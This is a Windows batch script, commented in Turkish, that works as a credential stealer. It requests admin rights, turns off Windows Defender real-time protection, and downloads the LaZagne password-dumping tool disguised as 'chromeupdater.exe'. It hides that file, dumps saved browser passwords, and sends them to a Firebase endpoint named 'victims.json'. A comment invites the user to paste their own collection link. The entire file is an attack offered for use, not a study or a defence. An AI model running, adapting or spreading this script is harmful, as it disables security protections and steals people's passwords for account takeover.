@echo off
:: Yönetici yetkisi kontrolü
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Yönetici yetkisi gerekli. Yeniden başlatılıyor...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:: Defender'ı geçici olarak kapat
echo [+] Defender real-time koruma devre dışı...
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"

:: Geçici klasöre geç
cd /d %TEMP%

:: Lazagne farklı adla indiriliyor (örneğin: chromeupdater.exe)
echo [+] Lazagne indiriliyor...
curl -L -o chromeupdater.exe https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe

:: Gizle
attrib +h chromeupdater.exe

:: Lazagne çalıştırılıyor
echo [+] Şifreler toplanıyor...
chromeupdater.exe browsers -oN -output results

:: Firebase'e gönderim için verileri oku
echo [+] Firebase'e veri gönderiliyor...
setlocal EnableDelayedExpansion
set LOGFILE=results\browsers.txt
set DATA=

for /f "usebackq delims=" %%A in ("%LOGFILE%") do (
    set "line=%%A"
    set "DATA=!DATA!!line!`n"
)

:: Firebase adresin (KENDİ LİNKİNİ BURAYA YAPIŞTIR!)
set FB=https://check-6c35e-default-rtdb.asia-southeast1.firebasedatabase.app/victims.json

:: PowerShell ile POST gönder
powershell -Command ^
  "$data = [System.Web.HttpUtility]::UrlEncode('%DATA%');" ^
  "$json = '{\"log\":\"' + $data + '\"}';" ^
  "Invoke-RestMethod -Uri '%FB%' -Method POST -Body $json -ContentType 'application/json'"

echo [+] Tamamlandı. Cikis yapılıyor.
timeout /t 3 >nul
exit
